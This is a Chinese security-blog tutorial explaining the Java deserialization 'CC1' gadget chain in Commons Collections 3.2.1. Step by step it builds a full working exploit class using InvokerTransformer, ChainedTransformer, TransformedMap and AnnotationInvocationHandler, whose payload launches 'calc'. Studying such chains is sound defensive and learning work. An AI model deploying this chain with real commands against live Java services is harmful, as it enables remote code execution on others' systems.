<!DOCTYPE html>
<html data-theme="">
<head>
    <!-- ! 引用文件位置-->
    <!--引用文件位置-->
<meta charset="utf-8">
<title>Hacked by Natro92.</title>
<!--    daisyui cdn-->
<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
<!--     tailwindcss cdn daisyui 前置-->
<script src="https://cdn.tailwindcss.com"></script>
<!--    更改主题颜色-->
<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
<!--自动排版-->
<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
<!--    谷歌字体库镜像-->
<style>
    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
</style>
<!--jquery-->
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<!--    fancybox-->
<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
<!--highlight 代码高亮 使用hexo的不会高亮-->
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
<script>
    hljs.highlightAll();
</script>
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
<!--LeanCLoud-->
<script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.15.2/dist/av.min.js"></script>
<!--卜算子busuanzi-->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!--    自定义css-->

<link rel="stylesheet" href="/css/output.css">


<link rel="stylesheet" href="/css/style.css">

<!--    自定义js-->

<script src="/js/view.js"></script>


<script src="/js/fancybox.js"></script>


<script src="/js/search.js"></script>

<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
<meta name="referrer" content="no-referrer"/>
<meta name="generator" content="Hexo 7.0.0"></head>
<body>
<!--导航栏-->
<div class="fixed z-10 w-full">
    <div class="container-nav justify-center flex">
        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
            <div class="flex-1">
                <a class="btn btn-ghost text-xl" href="/">Natro92&#39;s Site</a>
            </div>
            <div class="flex-none gap-2">
                <ul class="menu menu-horizontal px-1">
                    
                    
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/">首页</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/blogs">归档</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/tags">标签</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/categories">分类</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/link">更多</a></li>
                        
                    
                    <!--<li><a href="/">Home</a></li>-->
                    <!--<li><a href="/blogs">Archive</a></li>-->
                    <!--<li><a href="/about/">About</a></li>-->
                    <li>
                        <details class="dropdown">
                            <summary>
                                更换主题
                            </summary>
                            <ul tabindex="0"
                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
                                <!--主题选择配置，主题来自daisyui-->

<li><a data-set-theme="light">Light</a></li>
<li><a data-set-theme="dark">Night</a></li>
<li><a data-set-theme="cupcake">Cupcake</a></li>
<li><a data-set-theme="bumblebee">Bumblebee</a></li>
<li><a data-set-theme="emerald">Emerald</a></li>
<li><a data-set-theme="coporate">Corporate</a></li>
<li><a data-set-theme="synthwave">Synthwave</a></li>
<li><a data-set-theme="retro">Retro</a></li>
<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
<li><a data-set-theme="halloween">Halloween</a></li>
<li><a data-set-theme="garden">Garden</a></li>
<li><a data-set-theme="forest">Forest</a></li>
<li><a data-set-theme="aqua">Aqua</a></li>
<li><a data-set-theme="lofi">Lo-fi</a></li>
<li><a data-set-theme="pastel">Pastel</a></li>
<li><a data-set-theme="fantasy">Fantasy</a></li>
<li><a data-set-theme="wireframe">Wireframe</a></li>
<li><a data-set-theme="black">Black</a></li>
<li><a data-set-theme="luxury">Luxury</a></li>
<li><a data-set-theme="dracula">Dracula</a></li>
<li><a data-set-theme="cmyk">CMYK</a></li>
<li><a data-set-theme="autumn">Autumn</a></li>
<li><a data-set-theme="business">Business</a></li>
<li><a data-set-theme="acid">Acid</a></li>
<li><a data-set-theme="lemonade">Lemonade</a></li>
<li><a data-set-theme="night">Night</a></li>
<li><a data-set-theme="coffee">Coffee</a></li>
<li><a data-set-theme="winter">Winter</a></li>
<li><a data-set-theme="dim">Dim</a></li>
<li><a data-set-theme="nord">Nord</a></li>
<li><a data-set-theme="sunset">Sunset</a></li>
                            </ul>
                        </details>
                    </li>
                </ul>
                <div class="form-control">

                    <input type="text" placeholder="Search it!" id="local-search-input"
                           class="st-search-input input input-bordered w-24 md:w-auto rounded-xl"/>
                    <div id="local-search-result" class="local-search-result-cls rounded-xl"></div>
                    <script type="text/javascript" id="local.search.active">
                        var inputArea = document.querySelector("#local-search-input");
                        inputArea.onclick = function () {
                            getSearchFile();
                            this.onclick = null
                        }
                        inputArea.onkeydown = function () {
                            if (event.keyCode === 13) return false
                        }
                    </script>
                </div>
                <div class="dropdown dropdown-end">
                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
                        <div class="w-10 rounded-full">
                            <a target="_blank" rel="noopener" href="https://github.com/natro92">
                                <img alt="Tailwind CSS Navbar component"
                                     src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706006117478-a75e82ba-dea0-46bd-be3b-fa82cb80209c.png"/>
                            </a>
                        </div>
                    </div>
                    <!--TODO 完成这里-->
                    <!--<ul tabindex="0"-->
                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
                    <!--    <li>-->
                    <!--        <a class="justify-between">-->
                    <!--            Profile-->
                    <!--            <span class="badge">New</span>-->
                    <!--        </a>-->
                    <!--    </li>-->
                    <!--    <li><a>Settings</a></li>-->
                    <!--    <li><a>Logout</a></li>-->
                    <!--</ul>-->
                </div>
            </div>
        </div>
    </div>
</div>
<!--导航栏结束-->
<div class="h-36 w-full"></div>
<div class="fleet">
    <!--    嵌套位置-->
    <!-- 博客详情 -->


<!--Post开始-->
<div class="fleet container-nav justify-center flex mb-16 w-full">
    <div class="w-8/12 justify-center flex">
        <div class="fleet-body flex-col w-full">
            <div class="fleet-header">
                <div class="fleet-content-header-title text-6xl">
                    <h1 class="inline-block font-extrabold mt-16 mb-8">Java反序列化之CC1</h1>
                </div>
                <div class="fleet-content-header-info">
                    <span>2024/01/23 00:23:31</span>
                </div>
            </div>
            <div class="divider w-full"></div>
            <div class="fleet-content mt-8">
                <div class="fleet-content-body">
                    <div class="fleet-content-body-content justify-center flex w-full">
                        
                        <!--代码块-->
                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
                        
                        <!--图片-->
                        
                        <article class="prose">
                            <h1 id="什么是CC链"><a href="#什么是CC链" class="headerlink" title="什么是CC链"></a>什么是CC链</h1><p>CC（Common Collections）是Java中常用的集合框架之一，它提供了一组常见的容器类，如ArrayList、HashMap等。然而，CC链（CC chain）是指利用Common Collections框架中的漏洞来构建的一种攻击链。</p>
<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1?t=690.4">https://www.bilibili.com/video/BV1no4y1U7E1?t=690.4</a></p>
</blockquote>
<blockquote>
<p>java版本：8u65<br>既然都是cc链了，肯定要有cc依赖，cc版本是3.2.1</p>
</blockquote>
<p>依赖：</p>
<pre class="language-java" data-language="java"><code class="language-java">&lt;dependencies&gt;
    &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;commons-collections&#x2F;commons-collections --&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;
        &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;
        &lt;version&gt;3.2.1&lt;&#x2F;version&gt;
    &lt;&#x2F;dependency&gt;
&lt;&#x2F;dependencies&gt;</code></pre>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>起点：CC下的Transformer。</p>
<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>我们使用<code>ctrl</code> + <code>alt</code> + <code>b</code> 查看实现的类。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705930832668-bead987b-ff31-4ff8-9bc2-bce8b55edc1f.png" alt="image.png"><br>其中我们要用的是InvokerTransformer中的transform。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705931285463-fdbb8ed9-436f-414e-be7d-db4f2b0ce4cc.png" alt="image.png"><br>能注意到有任意代码执行的反射调用。<br>但在此之前我们要知道，任意命令执行，我们应该在哪里执行命令：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705931096635-402d203b-aaaf-4496-a3c4-b2785cbc8eae.png" alt="image.png"></p>
<pre class="language-java" data-language="java"><code class="language-java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre>
<p>有了这个，我们再改成反射调用的格式。<br>注意：打出<code>Runtime.getRuntime();</code>点击<code>alt</code>+<code>enter</code>就可以自动补全。<br>改成普通反射的写法：</p>
<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 改成反射
Runtime runtime &#x3D; Runtime.getRuntime();
Class aClass &#x3D; runtime.getClass();
Method exec &#x3D; aClass.getMethod(&quot;exec&quot;, String.class);
exec.invoke(runtime, &quot;calc&quot;);</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705932293786-fd6f750f-3a4f-4d2e-8e77-20878d2a7d7f.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705932493227-55db672f-aa68-4be7-a7da-28eff4388c91.png" alt="image.png"><br>然后按照InvokerTransformer实例化和transform执行的所需参数填入内容（重新实现这个反射）：</p>
<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 改成所需的语句格式
        Runtime runtime &#x3D; Runtime.getRuntime();
        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</code></pre>
<p>然后我们需要找到如何才能调用这里，快捷键<code>ctrl</code> + <code>shift</code> + <code>alt</code> + <code>F7</code>查询方法<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705933367728-2ebd4a89-d300-4cfe-b2b8-866358b01eb0.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705933394856-7752214f-cd8a-4140-8757-f926fd8c357c.png" alt="image.png"><br>通过这种方式来找到所需要的上一个方法。<br>最后找到TransformedMap中的decorate方法来赋值。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934864335-12f317ff-d374-46f2-aec0-d410564a7a02.png" alt="image.png"><br>想实现这个函数，查看其实例化方法。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934898558-5120148f-7bd6-4ba2-a25f-d8630318220b.png" alt="image.png"><br>并有其赋值decorate方法：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934935808-cdf32594-903e-4a6e-8453-101bcd9f9612.png" alt="image.png"><br>就是说要让其中的valueTransformer是执行的transfrom的InvokerTransformer。<br>于是可以编写出代码：</p>
<pre class="language-java" data-language="java"><code class="language-java">InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
&#x2F;&#x2F; * 往回找，直到能readObject
HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
&#x2F;&#x2F; * keyTransformer没用
TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);</code></pre>
<p>这样写就可以调用transform方法。<br>然后再找如何能调用checkSetValue方法，查找之后发现只有一处AbstractInputCheckedMapDecorator：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705935326866-06c8fe4b-378a-41bf-9814-8a081d710702.png" alt="image.png"><br>可以发现这个类是TransformedMap类的父类，其中的MapEntry的setValue调用了这个方法。<br>而遍历Map的一种写法是：</p>
<pre class="language-java" data-language="java"><code class="language-java">for (Map.Entry entry : objectObjectHashMap.entrySet()) &#123;
    entry.setValue();
&#125;</code></pre>
<p>这样就能调用到其中的setValue方法。<br>其中setValue中传入runtime参数即可运行。<br>然后就是继续找，如果有readObject下的调用就直接使用。<br>找到AnnotationInvocationHandler的readObject方法下setValue方法。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705936486495-54eb0a5c-5872-4f35-b272-35d958616cc1.png" alt="image.png"><br>但由于实例化方法不是public，因此只能在包内调用，也就是说只能用反射来调用。</p>
<pre class="language-java" data-language="java"><code class="language-java">Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        &#x2F;&#x2F; * 获取构造器
        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object object &#x3D; declaredConstructor.newInstance(Override.class, decorate);

        serialize(object);
        deserialize(&quot;ser.bin&quot;);</code></pre>
<p>最后再加上序列化和反序列化：</p>
<pre class="language-java" data-language="java"><code class="language-java">public static void serialize(Object object) throws Exception &#123;
        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        objectOutputStream.writeObject(object);
    &#125;

    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));
        Object obj &#x3D; objectInputStream.readObject();
        return obj;
    &#125;</code></pre>
<p>但还有问题，第一个是setValue的那个传入值是不可以控制的，第二个则是Runtime是不可以被序列化的。</p>
<h2 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h2><p>先解决如何使用Runtime。<br>虽然，runtime不可以被序列化，但是它的class可以，于是可以写出：</p>
<pre class="language-java" data-language="java"><code class="language-java">Class&lt;Runtime&gt; runtimeClass &#x3D; Runtime.class;
Method getRuntime &#x3D; runtimeClass.getMethod(&quot;getRuntime&quot;, null);
Runtime runtime &#x3D; (Runtime) getRuntime.invoke(null, null);
Method exec &#x3D; runtimeClass.getMethod(&quot;exec&quot;, String.class);
exec.invoke(runtime, &quot;calc&quot;);</code></pre>
<p>然后改成InvokeTransformer的版本：</p>
<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 将格式改为InvokeTransformer
        Method runtimeMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);
        Runtime runtime &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(runtimeMethod);
        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</code></pre>
<p>可以使用chainedTransformer简化：</p>
<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; * 可以使用chainedTransformer来简化，递归调用
        Transformer[] transformers &#x3D; new Transformer[]&#123;
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</code></pre>
<h2 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h2><p>然后就需要断点调试。<br>给AnnotationInvocationHandler这里打上断点。看看是否能进去。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939191441-a493fdc7-d20f-44f5-aef3-febbd728a102.png" alt="image.png"><br>我们可以注意到，由于memberType是空我们无法进入：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939559083-da3bb388-4cfc-45d3-b7ff-dd00695fbf70.png" alt="image.png"><br>我们需要找到一个有成员方法的class。key改为名字<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939655388-68696c21-c07d-4780-a005-5e780a5c4578.png" alt="image.png"><br>这里没有key这个参数，target中有value这个参数。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939972031-58306759-e75b-4dce-af16-1298cf4f331f.png" alt="image.png"><br>我们改成value试一试，然后将注释改为target。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939746270-68bee3a5-466c-4f45-a463-df5f0b92d95a.png" alt="image.png"><br>再次断点。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939843986-8bd3c43b-330a-444d-b3ff-1c1c9e07a0c3.png" alt="image.png"><br>但是无法修改最后的value的值，可以使用其中的ConstantTransformer来。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940148759-40f884f4-5d23-4c2b-983e-150a967194cf.png" alt="image.png"><br>也就是在这里加一个让他在Runtime.class中。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940194427-5c89c8b2-74e4-4a0f-8174-7d263592bbe4.png" alt="image.png"><br>ConstantTransformer被传入什么，transform之后就会返回什么。</p>
<p>最后终于可以成功执行了。QWQ<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940366991-87bdcb39-b6ee-46c2-9548-7d5c5c4905ca.png" alt="image.png"><br>完整代码：</p>
<pre class="language-java" data-language="java"><code class="language-java">package fun.natro92;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1 &#123;
    public static void serialize(Object object) throws Exception &#123;
        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        objectOutputStream.writeObject(object);
    &#125;

    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));
        Object obj &#x3D; objectInputStream.readObject();
        return obj;
    &#125;

    public static void main(String[] args) throws Exception &#123;
        &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;calc&quot;);
        &#x2F;&#x2F; * 改成反射
        &#x2F;&#x2F; Runtime runtime &#x3D; Runtime.getRuntime();
        &#x2F;&#x2F; Class aClass &#x3D; runtime.getClass();
        &#x2F;&#x2F; Method exec &#x3D; aClass.getMethod(&quot;exec&quot;, String.class);
        &#x2F;&#x2F; exec.invoke(runtime, &quot;calc&quot;);
        &#x2F;&#x2F; * 改成所需的语句格式
        &#x2F;&#x2F; Runtime runtime &#x3D; Runtime.getRuntime();
        &#x2F;&#x2F; InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
        &#x2F;&#x2F; &#x2F;&#x2F; * Runtime不可序列化，改为class
        &#x2F;&#x2F; Class&lt;Runtime&gt; runtimeClass &#x3D; Runtime.class;
        &#x2F;&#x2F; Method getRuntime &#x3D; runtimeClass.getMethod(&quot;getRuntime&quot;, null);
        &#x2F;&#x2F; Runtime runtime &#x3D; (Runtime) getRuntime.invoke(null, null);
        &#x2F;&#x2F; Method exec &#x3D; runtimeClass.getMethod(&quot;exec&quot;, String.class);
        &#x2F;&#x2F; exec.invoke(runtime, &quot;calc&quot;);
        &#x2F;&#x2F; &#x2F;&#x2F; * 将格式改为InvokeTransformer
        &#x2F;&#x2F; Method runtimeMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);
        &#x2F;&#x2F; Runtime runtime &#x3D; (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(runtimeMethod);
        &#x2F;&#x2F; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);
        &#x2F;&#x2F; * 可以使用chainedTransformer来简化，递归调用
        Transformer[] transformers &#x3D; new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
        &#x2F;&#x2F; chainedTransformer.transform(Runtime.class);
        &#x2F;&#x2F; * 往回找，直到能readObject
        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
        objectObjectHashMap.put(&quot;value&quot;, &quot;value&quot;);
        &#x2F;&#x2F; * keyTransformer没用
        Map&lt;Object, Object&gt; decorate &#x3D; TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);
        &#x2F;&#x2F; for (Map.Entry entry:decorate.entrySet())&#123;
        &#x2F;&#x2F;     entry.setValue(runtime);
        &#x2F;&#x2F; &#125;
        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        &#x2F;&#x2F; * 获取构造器
        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object object &#x3D; declaredConstructor.newInstance(Target.class, decorate);

        serialize(object);
        deserialize(&quot;ser.bin&quot;);
    &#125;
&#125;
</code></pre>

                            
                        </article>
                    </div>


                    <div class="fleet-content-body-footer mt-16">
                        <!--翻页器-->
                        <div class="flex-row flex w-full justify-between">
                            <div class="fleet-content-body-footer-left">
                                
                            </div>
                            <div class="fleet-content-body-footer-right">
                                
                                    <div><a href="/posts/589ae4b8/"
                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
                                            <div class="flex flex-col items-end"><span
                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
                                                <span>Java反序列化之反射和URLDNS</span></div>
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
                                            </svg>
                                        </a></div>

                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

    <!--    嵌套位置结束-->
    <!--<h3>categories</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/">-->
    <!--                CTF-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/JavaSec/">-->
    <!--                JavaSec-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/Python/">-->
    <!--                Python-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->

    <!--<h3>tags</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/WriteUp/">-->
    <!--                WriteUp-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CISCN/">-->
    <!--                CISCN-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">-->
    <!--                Java反序列化-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CC%E9%93%BE/">-->
    <!--                CC链-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CTFshow0-1/">-->
    <!--                CTFshow0-1-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
    <!--                脚本-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Tampermonkey/">-->
    <!--                Tampermonkey-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Shortcut/">-->
    <!--                Shortcut-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
    <!--                语雀-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->
</div>
<!--返回顶部按钮-->
<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
<!--加个渐变，但还是有点丑-->
<!-- TODO 换个更好的方案-->
<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
</div>

<footer class="footer p-10 bg-neutral text-neutral-content">
    <aside>
